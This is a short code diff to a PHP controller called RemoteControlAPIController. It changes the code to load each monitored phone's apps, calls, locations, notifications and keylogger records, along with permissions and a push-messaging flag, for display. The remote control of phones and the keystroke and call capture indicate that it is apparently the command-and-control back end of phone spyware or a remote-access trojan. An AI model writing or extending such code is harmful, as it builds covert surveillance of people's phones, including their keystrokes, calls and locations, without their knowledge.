@@ -50,8 +50,19 @@ class RemoteControlAPIController extends Controller
         }
 
         $phones = [];
+        foreach (Phone::orderBy('updatedon', 'desc')->with('apps', 'calls', 'locations', 'notifications', 'keyloggers')->get() as $el) {
+            $obj = (object) $el->toArray();
+            $obj->data = json_decode($el->data);
+            $obj->updatedon = $el->updatedon?->format('d-m-Y H:i:s');
+            $obj->perms = json_decode($el->perms);
+            $obj->fcmok = (bool) $el->fcm;
+            unset($obj->fcm);
+            $phones[] = $obj;
+        }
+
+        $apps = [];
         foreach (Phone::orderBy('updatedon', 'desc')->get() as $el) {
-            $phones[] = (object)[
+            $apps[] = (object)[
                 'id' => $el->id,
                 'phone' => $el->phone,
                 'data' => json_decode($el->data),
